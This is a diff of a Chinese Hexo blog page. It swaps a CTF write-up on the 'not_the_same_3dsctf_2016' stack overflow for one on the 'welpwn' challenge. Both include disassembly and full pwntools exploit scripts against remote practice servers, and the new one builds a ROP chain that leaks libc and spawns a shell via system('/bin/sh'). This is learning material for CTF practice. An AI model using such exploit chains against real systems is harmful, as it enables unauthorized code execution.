@@ -4,35 +4,37 @@
 
 <head>
     
-    <title>not_the_same_3dsctf_2016——练习 - Hexo</title>
+    <title>每日一题——welpwn - Hexo</title>
     <meta charset="UTF-8">
     <meta name="keywords" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
     
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <meta name="description" content="not_the_same_3dsctf_2016checksec 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  IDA32反编译，是静态编译 main函数没有什么端倪，但是发现这里的main没">
+    <meta name="description" content="每日一题——welpwn这道题是这几天来做的问题比较多的题，好多细节还是理解不到位checksecArch:     amd64-64-little RELRO:    Partial RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0x400000)  什么都没开 反编译后感觉很简单，但是read不能溢">
 <meta property="og:type" content="article">
-<meta property="og:title" content="not_the_same_3dsctf_2016——练习">
-<meta property="og:url" content="https://wuxiankwy.github.io/2023/08/23/not_the_same_3dsctf_2016%E2%80%94%E2%80%94%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:title" content="每日一题——welpwn">
+<meta property="og:url" content="https://wuxiankwy.github.io/2023/09/21/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94welpwn/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="not_the_same_3dsctf_2016checksec 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  IDA32反编译，是静态编译 main函数没有什么端倪，但是发现这里的main没">
+<meta property="og:description" content="每日一题——welpwn这道题是这几天来做的问题比较多的题，好多细节还是理解不到位checksecArch:     amd64-64-little RELRO:    Partial RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0x400000)  什么都没开 反编译后感觉很简单，但是read不能溢">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-08-23T08:47:57.000Z">
-<meta property="article:modified_time" content="2023-08-23T11:12:59.329Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210212214015901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05DX1JldHVybg==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2023-09-21T12:00:00.000Z">
+<meta property="article:modified_time" content="2023-09-21T12:08:53.218Z">
 <meta property="article:author" content="WuXianKwY">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210212214015901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05DX1JldHVybg==,size_16,color_FFFFFF,t_70">
     
 <link rel="stylesheet" href="/lib/fancybox/fancybox.css">
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1695298215215">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1695298215198">
     
-    <link rel="stylesheet" href="/css/style.css?v=1695298215215">
+    <link rel="stylesheet" href="/css/style.css?v=1695298215198">
 
     
         
-            <link rel="stylesheet" href="/custom.css?v=1695298215215">
+            <link rel="stylesheet" href="/custom.css?v=1695298215198">
         
     
 
@@ -41,7 +43,7 @@
 <script src="/lib/fancybox/fancybox.umd.js" async></script>
 
 
-    <script async src="/js/app.js?v=1695298215215"></script>
+    <script async src="/js/app.js?v=1695298215198"></script>
     
      
 
@@ -329,14 +331,14 @@
   <article>
     
         <div class="nexmoe-post-cover"> 
-            <img src="https://s3.bmp.ovh/imgs/2023/07/29/c015f7b9d559ce0e.png" alt="not_the_same_3dsctf_2016——练习" loading="lazy">
-            <h1>not_the_same_3dsctf_2016——练习</h1>
+            <img src="https://s3.bmp.ovh/imgs/2023/07/29/c015f7b9d559ce0e.png" alt="每日一题——welpwn" loading="lazy">
+            <h1>每日一题——welpwn</h1>
         </div>
     
     
     <div class="nexmoe-post-meta">
     <div class="nexmoe-rainbow">
-        <a class="nexmoefont icon-calendar-fill">2023年08月23日</a>
+        <a class="nexmoefont icon-calendar-fill">2023年09月21日</a>
         
         
     </div>
@@ -347,32 +349,28 @@
     
 </div>
 
-    <h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p>checksec</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+    <h1 id="每日一题——welpwn"><a href="#每日一题——welpwn" class="headerlink" title="每日一题——welpwn"></a>每日一题——welpwn</h1><h6 id="这道题是这几天来做的问题比较多的题，好多细节还是理解不到位"><a href="#这道题是这几天来做的问题比较多的题，好多细节还是理解不到位" class="headerlink" title="这道题是这几天来做的问题比较多的题，好多细节还是理解不到位"></a>这道题是这几天来做的问题比较多的题，好多细节还是理解不到位</h6><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><pre><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre>
+<p>什么都没开</p>
+<p>反编译后感觉很简单，但是read不能溢出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-400h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Welcome to RCTF\n&quot;, 0x10uLL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(0, &amp;buf, 0x400uLL);</span><br><span class="line">  echo((__int64)&amp;buf);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>IDA32反编译，是静态编译</p>
-<p>main函数没有什么端倪，但是发现这里的main没有ebp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:080489E0</span><br><span class="line">.text:080489E0</span><br><span class="line">.text:080489E0 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:080489E0                 public main</span><br><span class="line">.text:080489E0 main            proc near               ; DATA XREF: _start+17↑o</span><br><span class="line">.text:080489E0</span><br><span class="line">.text:080489E0 var_3C          = dword ptr -3Ch</span><br><span class="line">.text:080489E0 var_2D          = byte ptr -2Dh</span><br><span class="line">.text:080489E0 argc            = dword ptr  4</span><br><span class="line">.text:080489E0 argv            = dword ptr  8</span><br><span class="line">.text:080489E0 envp            = dword ptr  0Ch</span><br><span class="line">.text:080489E0</span><br><span class="line">.text:080489E0                 sub     esp, 3Ch</span><br><span class="line">.text:080489E3                 mov     [esp+3Ch+var_3C], offset aB0r4V3rS37u4hO ; &quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span><br><span class="line">.text:080489EA                 call    printf</span><br><span class="line">.text:080489EF                 lea     eax, [esp+3Ch+var_2D]</span><br><span class="line">.text:080489F3                 mov     [esp+3Ch+var_3C], eax</span><br><span class="line">.text:080489F6                 call    gets</span><br><span class="line">.text:080489FB                 xor     eax, eax</span><br><span class="line">.text:080489FD                 add     esp, 3Ch</span><br><span class="line">.text:08048A00                 retn    &lt;--</span><br><span class="line">.text:08048A00 main            endp    </span><br></pre></td></tr></table></figure>
+<p>进入echo()看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall echo(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s2[16]; // [rsp+10h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = 0;</span><br><span class="line">  if ( !strcmp(&quot;ROIS&quot;, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;RCTF&#123;Welcome&#125;&quot;, s2);</span><br><span class="line">    puts(&quot; is not flag&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return printf(&quot;%s&quot;, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>注意栈溢出时不需要再覆盖ebp的四个值</p>
-<p>找了一会没有找到和system，bin有关的函数和字符串，但在字符串区发现了flag.text</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.rodata:080BC2A8	00000009	C	flag.txt</span><br><span class="line">.rodata:080BC2B1	00000024	C	b0r4 v3r s3 7u 4h o b1ch4o m3m0... </span><br><span class="line">.rodata:080BC2D5	00000014	C	../csu/libc-start.c</span><br><span class="line">.rodata:080BC2E9	00000017	C	FATAL: kernel too old\n</span><br><span class="line">.rodata:080BC300	00000030	C	__ehdr_start.e_phentsize == sizeof *GL(dl_phdr)</span><br></pre></td></tr></table></figure>
+<p>s2允许输入16个数据，但是有0x400的传入空间，可以进行栈溢出，但是执行一遍发现不行，观察到s2中不能有0出现，而栈溢出中构造的ROP链都有0，所以要另辟蹊径。</p>
+<p>如何将rop链传入s2且不被检测到0呢？观察ida中的栈结构发现，echo栈就在main函数上面，二者栈是相连的，我们只需要在buf区构造rop链，然后在buf区利用pop执行所需命令，将rop链先存入payload的底部部分，上方用垃圾数据填充。当echo进行复制时，复制到pop4_ret停止，之后buf区的pop4将前4个栈区弹出，从而执行rop命令，获得got地址进行常规libc</p>
+<p>之后再相同格式调用system和bin_sh</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img-blog.csdnimg.cn/20210212214015901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05DX1JldHVybg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" data-caption="在这里插入图片描述" loading="lazy"></p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">elf = ELF(&#x27;./wel&#x27;)</span><br><span class="line">p = remote(&quot;61.147.171.105&quot;,53215)</span><br><span class="line">pop4_ret = 0x40089c</span><br><span class="line">pop_rdi = 0x4008a3</span><br><span class="line">main_addr = 0x4007CD</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">put_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">payload = flat([b&#x27;a&#x27;*0x18,p64(pop4_ret),p64(pop_rdi),p64(read_got),p64(put_plt),p64(main_addr)])</span><br><span class="line">p.recvuntil(b&#x27;to RCTF\n&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(b&#x27;a&#x27;*0x18)</span><br><span class="line">p.recv(3)</span><br><span class="line">read_addr = u64(p.recv(6).ljust(8, b&quot;\x00&quot;))</span><br><span class="line">libc = LibcSearcher(&quot;read&quot;,read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(&quot;read&quot;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload = flat([b&#x27;a&#x27;*0x18,p64(pop4_ret),p64(pop_rdi),p64(bin_sh),p64(system_addr)])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>跟进去看看</p>
-<p>CTRL+C进入调用函数get_secret()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int get_secret()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // esi</span><br><span class="line"></span><br><span class="line">  v0 = fopen(&quot;flag.txt&quot;, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, 45, v0);</span><br><span class="line">  return fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>分析函数，flag被储存在fl4g里，找到fl4g的bss地址:080ECA2D，进行栈溢出</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:080ECA2C                 db    ? ;</span><br><span class="line">.bss:080ECA2D                 public fl4g</span><br><span class="line">.bss:080ECA2D fl4g            db    ? ;               ; DATA XREF: get_secret+26↑o</span><br><span class="line">.bss:080ECA2E                 db    ? ;</span><br></pre></td></tr></table></figure>
-
-<p>需要把flag打印出来，这里可以用print，put，write函数</p>
-<p>想到main里就摆着一个printf，直接调用它打印，至于其他函数，有则可用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; // [esp+Fh] [ebp-2Dh]</span><br><span class="line"></span><br><span class="line">  printf((int)&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编写exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26828)</span><br><span class="line">elf = ELF(&quot;./NTS&quot;)</span><br><span class="line"></span><br><span class="line">flag_addr = 0x080ECA2D</span><br><span class="line">secret_addr = 0x080489A0</span><br><span class="line">printf_addr = 0x0804F0A0</span><br><span class="line"></span><br><span class="line">payload = 0x2d * b&#x27;a&#x27; + p32(secret_addr) + p32(printf_addr) + p32(elf.sym[&#x27;exit&#x27;]) + p32(flag_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>补充：这里的flag在缓冲区，需要程序结束printf才能打印缓冲区的内容，所以额外调用了exit.</p>
+<p>注：</p>
+<p>p.recv(3)是用来接收printf打印的pop4_ret，ljust(8, b”\x00”)是64位程序需要的格式。</p>
 
     <p><img src="https://s3.bmp.ovh/imgs/2023/08/25/5d9bf97786040a97.jpg" loading="lazy"></p>
 
@@ -382,7 +380,7 @@
       
     <div class="nexmoe-post-copyright">
         <strong>Author：</strong>WuXianKwY<br>
-        <strong>Link：</strong><a href="https://wuxiankwy.github.io/2023/08/23/not_the_same_3dsctf_2016%E2%80%94%E2%80%94%E7%BB%83%E4%B9%A0/" title="https:&#x2F;&#x2F;wuxiankwy.github.io&#x2F;2023&#x2F;08&#x2F;23&#x2F;not_the_same_3dsctf_2016%E2%80%94%E2%80%94%E7%BB%83%E4%B9%A0&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;wuxiankwy.github.io&#x2F;2023&#x2F;08&#x2F;23&#x2F;not_the_same_3dsctf_2016%E2%80%94%E2%80%94%E7%BB%83%E4%B9%A0&#x2F;</a><br>
+        <strong>Link：</strong><a href="https://wuxiankwy.github.io/2023/09/21/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94welpwn/" title="https:&#x2F;&#x2F;wuxiankwy.github.io&#x2F;2023&#x2F;09&#x2F;21&#x2F;%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94welpwn&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;wuxiankwy.github.io&#x2F;2023&#x2F;09&#x2F;21&#x2F;%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94welpwn&#x2F;</a><br>
         
             <strong>内网映射搭建了个本机我的世界多模组服务器，暑假可以一起来玩ya
 
@@ -398,7 +396,7 @@
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1695298215181"></script>
+    <script async src="/js/copy-codeblock.js?v=1695298215179"></script>
   
 
   
@@ -420,7 +418,7 @@
                               <button class="mdui-fab catalog" style="overflow:unset;">
                                   <i class="nexmoefont icon-i-catalog"></i>
                                   <div class="nexmoe-toc">
-                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#not-the-same-3dsctf-2016"><span class="toc-number">1.</span> <span class="toc-text">not_the_same_3dsctf_2016</span></a></li></ol>
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94welpwn"><span class="toc-number">1.</span> <span class="toc-text">每日一题——welpwn</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%99%E9%81%93%E9%A2%98%E6%98%AF%E8%BF%99%E5%87%A0%E5%A4%A9%E6%9D%A5%E5%81%9A%E7%9A%84%E9%97%AE%E9%A2%98%E6%AF%94%E8%BE%83%E5%A4%9A%E7%9A%84%E9%A2%98%EF%BC%8C%E5%A5%BD%E5%A4%9A%E7%BB%86%E8%8A%82%E8%BF%98%E6%98%AF%E7%90%86%E8%A7%A3%E4%B8%8D%E5%88%B0%E4%BD%8D"><span class="toc-number">1.0.0.0.0.1.</span> <span class="toc-text">这道题是这几天来做的问题比较多的题，好多细节还是理解不到位</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#checksec"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">checksec</span></a></li></ol></li></ol></li></ol></li></ol>
                                   </div>
                               </button>
                           
